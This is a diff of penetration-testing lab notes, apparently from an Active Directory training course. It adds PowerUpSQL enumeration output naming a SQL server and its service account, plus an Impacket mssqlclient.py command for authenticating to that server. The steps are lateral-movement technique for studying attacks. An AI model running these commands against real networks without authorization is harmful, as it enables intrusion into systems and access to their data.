@@ -120,6 +120,9 @@ cd .\PowerUpSQL\
 Import-Module .\PowerUpSQL.ps1
 
 Get-SQLInstanceDomain
+
+ComputerName : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL Instance : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433 
+DomainAccountSid : 1500000521000170152142291832437223174127203170152400 DomainAccount : damundsen DomainAccountCn : Dana Amundsen Service : MSSQLSvc Spn : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433 LastLogon : 4/6/2022 11:59 AM
 ```
 
 *We could then authenticate against the remote SQL server host and run custom queries or operating system commands*
@@ -129,4 +132,10 @@ Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\dam
 ```
 
 **We can also authenticate from our Linux attack host using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from the Impacket toolkit.**
+
+#### Running mssqlclient.py Against the Target
+
+```powershell
+mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+```
 
